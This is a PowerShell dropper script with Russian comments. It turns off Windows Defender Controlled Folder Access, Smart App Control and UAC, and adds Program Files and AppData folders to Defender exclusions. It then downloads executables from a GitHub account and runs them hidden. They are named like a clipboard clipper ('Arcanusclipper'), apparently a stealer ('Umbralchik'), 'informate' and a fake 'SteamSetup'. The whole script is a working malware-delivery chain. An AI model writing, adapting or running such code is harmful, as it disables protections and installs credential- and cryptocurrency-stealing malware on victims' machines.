Set-MpPreference -EnableControlledFolderAccess Disabled
# Создаём ключ, если его нет
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Force | Out-Null

# Устанавливаем значение 0 = Off
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\CI\Policy" -Name "VerifiedAndReputablePolicyState" -Value 0 -Type DWord -Force

# 1. Изменяем параметр в реестре (как и раньше)
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force

# 2. Уведомляем систему об изменении, чтобы она применила настройки немедленно
# Эта команда имитирует рассылку сообщения всем окнам о смене системных параметров
rundll32.exe user32.dll,UpdatePerUserSystemParameters

# 3. Перезапускаем Проводник (Explorer.exe), который является основной оболочкой Windows
# Это самый важный шаг для немедленного применения изменений, связанных с UAC и UI.
Stop-Process -Name explorer -Force

# 4. (Опционально, но рекомендуется) Перезапускаем службы, которые могут зависеть от UAC
# Это помогает избежать возможных сбоев в программах, работающих в фоновом режиме.
Restart-Service -Name "wuauserv" -Force # Служба обновления Windows
Restart-Service -Name "bits" -Force     # Служба фоновой интеллектуальной передачи

# --- БЛОК 2: ДОБАВЛЕНИЕ ИСКЛЮЧЕНИЙ (если нужно) ---

# Добавляем папки в исключения, чтобы антивирус не мешал работе программ
Write-Host "Добавление папок в исключения..."
try {
    $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFiles")
    Add-MpPreference -ExclusionPath $ProgramFiles

    $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
    if (Test-Path $ProgramFilesX86) {
        Add-MpPreference -ExclusionPath $ProgramFilesX86
    }

    $AppData = [System.Environment]::GetFolderPath("ApplicationData")
    Add-MpPreference -ExclusionPath $AppData

    $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
    Add-MpPreference -ExclusionPath $LocalAppData
    
    Write-Host "Исключения добавлены." -ForegroundColor Green
}
catch {
    Write-Host "Не удалось добавить исключения." -ForegroundColor Red
}

Write-Host "`nВсе команды выполнены. Для применения изменений UAC рекомендуется перезагрузить компьютер." -ForegroundColor Cyan
$uacPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
$uacProperty = "EnableLUA"
Set-ItemProperty -Path $uacPath -Name $uacProperty -Value 0

try {
    if (Get-Command Add-MpPreference -ErrorAction SilentlyContinue) {
        $ProgramFiles = [System.Environment]::GetFolderPath("ProgramFilesX86")
        $updpath = $ProgramFiles -replace " \(x86\)", ""
        Add-MpPreference -ExclusionPath $updpath

        $ProgramFilesX86 = [System.Environment]::GetFolderPath("ProgramFilesX86")
        if (Test-Path $ProgramFilesX86) {
            Add-MpPreference -ExclusionPath $ProgramFilesX86
        }

        $AppData = [System.Environment]::GetFolderPath("ApplicationData")
        Add-MpPreference -ExclusionPath $AppData

        $LocalAppData = [System.Environment]::GetFolderPath("LocalApplicationData")
        Add-MpPreference -ExclusionPath $LocalAppData
        }
        }
catch {
}

      # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/files/raw/refs/heads/main/Arcanusclipper.exe" -OutFile "Arcanusclipper.exe"; .\Arcanusclipper.exe    
    # Запускаем 
    Start-Process -FilePath "Arcanusclipper.exe" -WindowStyle Hidden
    
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/Umbralchik.exe" -OutFile "Umbralchik.exe"; .\Umbralchik.exe    
    # Запускаем 
    Start-Process -FilePath "Umbralchik.exe" -WindowStyle Hidden
    
    # Удаляем файл через 5 секунды
   
    # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/informate.exe" -OutFile "informate.exe" -ErrorAction SilentlyContinue
    
    # Запускаем 
    Start-Process -FilePath "informate.exe" -WindowStyle Hidden
     # Скачиваем everything в текущую папку
    Invoke-WebRequest -Uri "https://github.com/Proshkaversus/exe/raw/refs/heads/main/SteamSetup.exe" -OutFile "SteamSetup.exe" -ErrorAction SilentlyContinue
    
    



















